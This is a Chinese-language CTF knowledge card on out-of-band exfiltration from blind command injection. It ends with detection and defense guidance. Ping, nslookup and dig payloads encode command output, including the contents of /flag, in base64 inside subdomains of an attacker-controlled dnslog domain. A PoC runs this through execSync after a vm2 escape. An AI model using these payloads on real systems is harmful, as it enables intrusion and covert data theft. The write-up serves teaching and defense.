---
id: ctf-web-noecho-ping-base64-dns-exfil
title: 无回显命令执行用 ping + $() + base64 把输出编码进 DNS 域名外带
type: scenario
domain: ctf
path: ctf/web
technique: noecho-ping-base64-dns-exfiltration
aliases:
- ping 外带
- 无回显命令注入外带
- base64 DNS exfil
- dnslog ping 带数据
- $() 命令拼接外带
- 命令替换 DNS 外带
tags:
- ctf
- web
- command-injection
- oob
- dns
- exfiltration
- ping
- base64
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V558
  verified_at: '2026-11-12T00:49:10+08:00'
  notes: 已对照原文与图：图04 execSync 平台回显 ping bad address 且错误串为 base64(ls 输出) YXBw...dHI=，图05 CyberChef From Base64 解出 app bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var，卡中 PoC 串与之一致；已把证据表述改为“图04 错误回显/图05 解码间接印证，原文未贴 dnslog 收包截图”。dedup top 候选为 SQLi DNS 外带、AI Agent ping 外带、DNS 取证重组、盲命令 cp 覆盖等，入口/场景不同，new 成立。未验证点：未复跑；dnslog 是否实际收到查询无直接截图。
---

## 一句话结论

命令执行无回显且 `curl`/`wget`/bash 反弹都不可用时，可用 `ping $(echo $(<命令>)|base64 -w0)<攻击者域名>`：命令输出经 base64 编码后作为 DNS 主机名的一部分，`ping` 触发 DNS 查询把数据带到 dnslog/自建 DNS 平台，从而在只有出站 DNS 的环境里完成数据外带。

## 原理

- **命令替换先执行**：shell 在解析命令行时先执行 `$(...)`，其中可以串联任意命令（`$(rm a && ln -s ... && cat ...)`），其标准输出成为外层命令的参数。
- **base64 把任意字节变成域名可用字符**：`base64 -w0` 输出单行 base64 字符串，绝大多数字符属于 `[A-Za-z0-9+/=]`；把它拼到 `<payload>.<attacker-domain>` 前面，就构造出一个携带数据的域名。
- **ping 强制触发 DNS 解析**：即使 ICMP 被防火墙阻断，`ping <域名>` 仍需先做 DNS 查询；攻击者控制的权威 DNS（dnslog 平台）会记录查询名，从而收到数据。这样就绕过了“HTTP 出网被封/无回显”的限制。
- **限制**：DNS 单个标签最长 63 字符、完整域名最长 253 字符；输出较长时需要分片多次 ping（每片一个子域），或用压缩后的数据；base64 中的 `+`、`/`、`=` 不是合法主机名字符，部分解析器会拒绝或改写，实战中常改用 base64url/hex，或依赖平台容错。
- **为什么原文 bash+curl 不行**：执行环境限制/缺少 curl，而 ping 通常随系统存在且几乎总是允许出站 DNS，故成为兜底通道。

## 触发条件

- 目标存在无回显的命令执行（RCE/命令注入/沙箱逃逸后的 `execSync` 等），且可执行 shell 复合命令（`$()`、管道）。
- 目标能进行出站 DNS 解析（多数内网/容器环境默认允许），攻击者拥有 dnslog 或自建权威 DNS 域名。
- 系统存在 `ping`（或可用 `nslookup`/`dig`/`host` 替代），`base64` 可用。

## 利用步骤

1. 在 dnslog 平台获取一个回显域名（如 `xxxx.dnslog.cn`）。
2. 先验证通道：`ping $(echo test|base64 -w0).xxxx.dnslog.cn`，在平台查看是否收到 `<base64(test)>.xxxx.dnslog.cn` 查询。
3. 外带目标数据：把命令输出放进 `$()`，如 `ping $(echo $(ls)|base64 -w0).xxxx.dnslog.cn`。
4. 在 dnslog 平台复制收到的子域名前缀，base64 解码得到命令输出。
5. 数据较长时分片：`ping $(echo $(cat flag|base64 -w0|cut -c1-50)).1.xxxx.dnslog.cn` 等多条命令拼接。

## PoC

```javascript
// 原文：vm2 逃逸拿到 execSync 后，无回显环境下外带目录列表
execSync('ping $(echo $(ls)|base64 -w0)uth1r9.dnslog.cn')
// 平台回显/dnslog 中的 base64（图04 错误串、图05 解码）: YXBwIGJpbiBkZXYgZXRjIGhvbWUgbGliIG1lZGlhIG1udCBvcHQgcHJvYyByb290IHJ1biBzYmluIHNydiBzeXMgdG1wIHVzciB2YXI=
// base64 -d -> app bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var
```

```bash
# 通用 shell 形式
ping $(echo $(cat /flag)|base64 -w0).<your-dnslog-domain>
```

原文在 L3HCTF escape-web 题中使用该方式外带容器目录结构与后续 flag 内容，并称成功外带；图04 的平台回显 ping 错误串即 base64(ls 输出)，图05 解码得目录列表，但原文未贴 dnslog 收包截图，查询是否到达 dnslog 由回显与解码结果间接印证。

## 变体与关联

- **工具变体**：`nslookup $(...).domain`、`dig $(...).domain`、`host $(...).domain`；Windows 下 `nslookup`；有 curl 时可用 `curl http://ip/$(...|base64)`。
- **编码变体**：base64url（`-`/`_` 替换 `+`/`/`）、hex（`xxd -p`）、base32；配合分片时需在服务端按序号重组。
- **关联**：[[ctf-web-file-path-cmdinj-output-drop-arbitread]]——盲命令注入的另一条取数路径（输出落盘后再用任意文件读取回读），与本卡（DNS 外带）互补。
- **关联**：[[web-generic-sqli-dnslog-oob-exfiltration]]——SQL 注入场景的 DNS 外带，原理相同、入口不同。
- **边界**：目标完全禁止出站 DNS 时通道失效；域名长度限制需要分片；base64 特殊字符可能被解析器拒绝，需用 URL-safe 编码。

## 检测与防御

- **检测**：DNS 查询日志中出现超长随机子域名、编码特征（base64/hex）与高频异常查询；命令审计中发现 `ping $(...)`、`base64 -w0`、`dnslog` 等组合；容器/主机侧 EDR 监控 ping 携带超长参数。
- **防御**：限制出站 DNS 到受信解析器并开启查询日志与长度告警；禁止业务主机直接访问外部 DNS；对命令执行做白名单与参数校验；无回显场景下的出站通道应统一封堵（TCP/UDP/ICMP/DNS）。
